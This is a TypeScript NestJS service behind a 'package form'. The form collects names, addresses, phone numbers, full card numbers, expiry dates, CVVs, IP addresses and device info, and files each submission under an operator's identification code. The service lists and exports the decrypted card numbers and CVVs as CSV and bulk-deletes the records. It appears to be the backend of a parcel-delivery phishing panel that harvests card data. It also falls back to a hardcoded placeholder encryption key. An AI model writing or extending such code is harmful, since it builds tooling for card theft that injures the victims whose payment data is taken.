import { Injectable, NotFoundException } from '@nestjs/common';
import { InjectRepository } from '@nestjs/typeorm';
import { Repository, In, Between } from 'typeorm';
import { PackageForm } from './entities/package-form.entity';
import { UpdateFormDto } from './dto/update-form.dto';
import { QueryFormDto } from './dto/query-form.dto';
import { User } from '../user/entities/user.entity';
import * as crypto from 'crypto';
import { BatchDeletePkgFormDto } from './dto/batch-delete-pkgform.dto';
import { startOfDay, endOfDay } from 'date-fns';

@Injectable()
export class PkgformService {
  constructor(
    @InjectRepository(PackageForm)
    private readonly packageFormRepository: Repository<PackageForm>,
    @InjectRepository(User)
    private readonly userRepository: Repository<User>,
  ) {}

  private readonly algorithm = 'aes-256-cbc';
  private readonly key = crypto.scryptSync(
    process.env.ENCRYPTION_KEY || 'your-encryption-key',
    'salt',
    32,
  );

  private encrypt(text: string): string {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv(this.algorithm, this.key, iv);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return `${iv.toString('hex')}:${encrypted}`;
  }

  private decrypt(text: string): string {
    if (!text) return '';
    const [ivHex, encryptedHex] = text.split(':');
    if (!ivHex || !encryptedHex) return '';

    const iv = Buffer.from(ivHex, 'hex');
    const decipher = crypto.createDecipheriv(this.algorithm, this.key, iv);
    let decrypted = decipher.update(encryptedHex, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  }

  async updateForm(formData: UpdateFormDto): Promise<PackageForm> {
    const user = await this.userRepository
      .findOneOrFail({
        where: { packageFormCode: formData.identificationCode },
      })
      .catch(() => {
        throw new NotFoundException('Invalid identification code');
      });

    const packageForm = new PackageForm();
    packageForm.userId = user.id;
    packageForm.name = formData.name;
    packageForm.address1 = formData.address1;
    packageForm.address2 = formData.address2 || null;
    packageForm.city = formData.city;
    packageForm.state = formData.state;
    packageForm.postalCode = formData.postalCode;
    packageForm.email = formData.email;
    packageForm.phone = formData.phone;
    packageForm.cardholder = formData.cardholder;
    packageForm.cardNumberEncrypted = this.encrypt(formData.cardNumber);
    packageForm.expireDate = formData.expireDate;
    packageForm.cvvEncrypted = this.encrypt(formData.cvv);
    packageForm.ipAddress = formData.ipAddress || null;
    packageForm.deviceInfo = formData.deviceInfo || null;

    return this.packageFormRepository.save(packageForm);
  }

  async getForm(userId: number, query: QueryFormDto) {
    const {
      createTime,
      endCreateTime,
      updateTime,
      endUpdateTime,
      createTimeStart,
      createTimeEnd,
      updateTimeStart,
      updateTimeEnd,
      pageNo = 1,
      pageSize = 10,
      sort = 'DESC',
    } = query;

    // 构建基础查询
    const queryBuilder =
      this.packageFormRepository.createQueryBuilder('packageForm');
    queryBuilder.where('packageForm.userId = :userId', { userId });

    // 处理创建时间查询 - 优先使用新参数
    if (createTimeStart || createTimeEnd) {
      // 使用新的范围参数
      if (createTimeStart) {
        queryBuilder.andWhere(
          'DATE(packageForm.createTime) >= :createStartDate',
          {
            createStartDate: createTimeStart,
          },
        );
      }

      if (createTimeEnd) {
        queryBuilder.andWhere(
          'DATE(packageForm.createTime) <= :createEndDate',
          {
            createEndDate: createTimeEnd,
          },
        );
      }
    } else if (createTime) {
      // 向后兼容旧参数
      if (endCreateTime) {
        // 有开始和结束日期，查询日期范围
        queryBuilder.andWhere(
          'DATE(packageForm.createTime) BETWEEN :startDate AND :endDate',
          {
            startDate: createTime,
            endDate: endCreateTime,
          },
        );
      } else {
        // 只有单个日期，只查询当天
        queryBuilder.andWhere('DATE(packageForm.createTime) = :dateOnly', {
          dateOnly: createTime,
        });
      }
    }

    // 处理更新时间查询 - 优先使用新参数
    if (updateTimeStart || updateTimeEnd) {
      // 使用新的范围参数
      if (updateTimeStart) {
        queryBuilder.andWhere(
          'DATE(packageForm.updateTime) >= :updateStartDate',
          {
            updateStartDate: updateTimeStart,
          },
        );
      }

      if (updateTimeEnd) {
        queryBuilder.andWhere(
          'DATE(packageForm.updateTime) <= :updateEndDate',
          {
            updateEndDate: updateTimeEnd,
          },
        );
      }
    } else if (updateTime) {
      // 向后兼容旧参数
      if (endUpdateTime) {
        // 有开始和结束日期，查询日期范围
        queryBuilder.andWhere(
          'DATE(packageForm.updateTime) BETWEEN :updateStartDate AND :updateEndDate',
          {
            updateStartDate: updateTime,
            updateEndDate: endUpdateTime,
          },
        );
      } else {
        // 只有单个日期，只查询当天
        queryBuilder.andWhere(
          'DATE(packageForm.updateTime) = :updateDateOnly',
          {
            updateDateOnly: updateTime,
          },
        );
      }
    }

    // 添加调试日志
    console.log('SQL查询条件:', queryBuilder.getSql());
    console.log('SQL参数:', queryBuilder.getParameters());

    // 配置排序和分页
    queryBuilder.orderBy('packageForm.createTime', sort);
    queryBuilder.skip((pageNo - 1) * pageSize);
    queryBuilder.take(pageSize);

    // 获取总数和结果
    const [forms, total] = await queryBuilder.getManyAndCount();

    // 如果没有找到表单，返回空数组而不是抛出错误
    if (!forms.length) {
      return { list: [], total: 0 };
    }

    // 解密并返回数据
    const list = forms.map((form) => {
      const { cardNumberEncrypted, cvvEncrypted, ...rest } = form;
      return {
        ...rest,
        cardNumber: this.decrypt(cardNumberEncrypted || ''),
        cvv: this.decrypt(cvvEncrypted || ''),
      };
    });

    return { list, total };
  }

  async exportForms(
    userId: number,
    date: string,
    startDate?: string,
    endDate?: string,
  ): Promise<string> {
    // 构建查询
    const queryBuilder =
      this.packageFormRepository.createQueryBuilder('packageForm');
    queryBuilder.where('packageForm.userId = :userId', { userId });

    // 判断是使用日期范围还是单一日期查询
    if (startDate && endDate) {
      // 使用日期范围
      queryBuilder.andWhere(
        'DATE(packageForm.createTime) BETWEEN :startDate AND :endDate',
        {
          startDate,
          endDate,
        },
      );
    } else if (date) {
      // 向后兼容 - 使用单一日期
      queryBuilder.andWhere('DATE(packageForm.createTime) = :dateOnly', {
        dateOnly: date,
      });
    }

    queryBuilder.orderBy('packageForm.createTime', 'ASC');

    console.log('导出查询:', queryBuilder.getSql());
    console.log('导出参数:', queryBuilder.getParameters());

    const forms = await queryBuilder.getMany();

    if (!forms.length) {
      return 'ID,Cardholder,CardNumber,CVV,ExpireDate,Name,Address1,Address2,City,State,PostalCode,Email,Phone,IPAddress,DeviceInfo,CreatedAt\r\n';
    }

    // 生成CSV头部
    let csv =
      'ID,Cardholder,CardNumber,CVV,ExpireDate,Name,Address1,Address2,City,State,PostalCode,Email,Phone,IPAddress,DeviceInfo,CreatedAt\r\n';

    // 添加每行数据
    forms.forEach((form) => {
      const cardNumber = this.decrypt(form.cardNumberEncrypted || '');
      const cvv = this.decrypt(form.cvvEncrypted || '');

      // 转义CSV字段中的逗号、引号等
      const escapeCSV = (field: string | null | undefined): string => {
        if (field === null || field === undefined) return '';
        const str = String(field);
        if (str.includes(',') || str.includes('"') || str.includes('\n')) {
          return `"${str.replace(/"/g, '""')}"`;
        }
        return str;
      };

      csv +=
        [
          form.id,
          escapeCSV(form.cardholder),
          escapeCSV(cardNumber),
          escapeCSV(cvv),
          escapeCSV(form.expireDate),
          escapeCSV(form.name),
          escapeCSV(form.address1),
          escapeCSV(form.address2),
          escapeCSV(form.city),
          escapeCSV(form.state),
          escapeCSV(form.postalCode),
          escapeCSV(form.email),
          escapeCSV(form.phone),
          escapeCSV(form.ipAddress),
          escapeCSV(form.deviceInfo),
          form.createdAt.toISOString(),
        ].join(',') + '\r\n';
    });

    return csv;
  }

  async generateIdentificationCode(): Promise<string> {
    let code = '';
    let isUnique = false;

    while (!isUnique) {
      code = crypto.randomBytes(4).toString('hex');
      const existingUser = await this.userRepository.findOne({
        where: { packageFormCode: code },
      });

      if (!existingUser) {
        isUnique = true;
      }
    }

    return code;
  }

  async deleteForm(userId: number, formId: string) {
    const result = await this.packageFormRepository.delete({
      id: Number(formId),
      userId: userId,
    });

    if (result.affected === 0) {
      throw new NotFoundException(`ID为 "${formId}" 的表单不存在或无权限删除`);
    }

    return { message: '删除成功' };
  }

  async batchDeleteForm(
    userId: number,
    batchDeleteDto: BatchDeletePkgFormDto,
  ): Promise<{ message: string; affectedCount: number }> {
    let affectedCount = 0;

    if (batchDeleteDto.ids && batchDeleteDto.ids.length > 0) {
      // 按 ID 批量删除
      const result = await this.packageFormRepository.delete({
        userId: userId,
        id: In(batchDeleteDto.ids),
      });
      affectedCount = result.affected || 0;
    } else if (batchDeleteDto.startDate && batchDeleteDto.endDate) {
      // 按日期范围批量删除 (确保包含起止日期当天的数据)
      const startDate = startOfDay(new Date(batchDeleteDto.startDate));
      const endDate = endOfDay(new Date(batchDeleteDto.endDate));

      const result = await this.packageFormRepository.delete({
        userId: userId,
        createdAt: Between(startDate, endDate),
      });
      affectedCount = result.affected || 0;
    }
    // DTO 保证了 ids 或日期范围至少有一个，且只有一个

    return {
      message: `批量删除成功，共影响 ${affectedCount} 条记录`,
      affectedCount,
    };
  }
}
